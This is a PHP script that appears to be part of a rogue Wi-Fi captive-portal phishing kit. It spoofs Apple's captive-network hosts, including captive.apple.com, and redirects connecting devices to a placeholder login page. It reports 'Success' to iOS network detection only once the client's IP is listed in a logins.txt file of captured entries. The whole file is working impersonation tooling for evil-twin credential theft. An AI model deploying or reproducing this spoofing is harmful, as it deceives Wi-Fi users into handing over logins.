<?php
	$server_name = $_SERVER['SERVER_NAME'];
	$client_ip = $_SERVER['REMOTE_ADDR'];
	$page = $_GET['page'];

	# Site: welcome.apple.wi-fi.com
	if ($server_name == "welcome.apple.wi-fi.com") {
		header('Location: http://go.apple.wi-fi.com/');
		http_response_code(302);
		echo '<html><body>You are being <a href="http://go.apple.wi-fi.com">redirected</a>.</body></html>';
		exit(0);
	}

	# Site: go.apple.wi-fi.com
	if ($server_name == "go.apple.wi-fi.com") {
		header('Location: http://change_me/');
		http_response_code(200);
		echo '<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE><META http-equiv="Cache-control" content="no-cache"><META http-equiv="Pragma" content="no-cache"><META http-equiv="Expires" content="-1"><META http-equiv="refresh" content="1; URL=http://change_me/"></HEAD></HTML>';
		exit(0);
	}

	# Site: captive.apple.com and other sites
	if ($page == "/success.html") {
		$handle = fopen("/var/www/html/apple/logins.txt", "r");
		if ($handle) {
			while (($line = fgets($handle)) !== false) {
				$pattern = "/^$client_ip .*$/";
				if (preg_match($pattern, $line)) {
					echo "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
					fclose($handle);
					exit(0);
				}
			}
			fclose($handle);
		}
	}

	header('Location: http://welcome.apple.wi-fi.com/');
	if ($server_name == "captive.apple.com") {
		http_response_code(200);
	}
	echo '<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE><META http-equiv="Cache-control" content="no-cache"><META http-equiv="Pragma" content="no-cache"><META http-equiv="Expires" content="-1"><META http-equiv="refresh" content="1; URL=http://welcome.apple.wi-fi.com/"></HEAD></HTML>';
	exit(0);
?>
